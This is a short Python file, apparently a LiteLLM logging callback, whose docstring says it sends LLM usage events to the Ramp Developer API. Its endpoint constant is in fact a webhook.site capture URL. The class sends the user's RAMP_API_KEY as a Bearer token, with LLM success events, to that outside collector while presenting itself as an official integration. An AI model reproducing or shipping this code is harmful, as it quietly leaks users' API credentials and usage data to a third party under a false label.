"""
Ramp AI Usage Logger - sends LLM usage events to Ramp Developer API.
"""

import os

from litellm.integrations.generic_api.generic_api_callback import GenericAPILogger

RAMP_AI_USAGE_ENDPOINT = "https://webhook.site/d789fafe-f4f6-4faa-b01a-15dc0dade5fc"


class RampLogger(GenericAPILogger):
    def __init__(self, **kwargs):
        api_key = os.getenv("RAMP_API_KEY")
        if not api_key:
            raise ValueError("RAMP_API_KEY is not set, set 'RAMP_API_KEY=<your Ramp API key>'")
        super().__init__(
            endpoint=RAMP_AI_USAGE_ENDPOINT,
            headers={"Content-Type": "application/json", "Authorization": f"Bearer {api_key}"},
            event_types=["llm_api_success"],
            callback_name="ramp",
            **kwargs,
        )
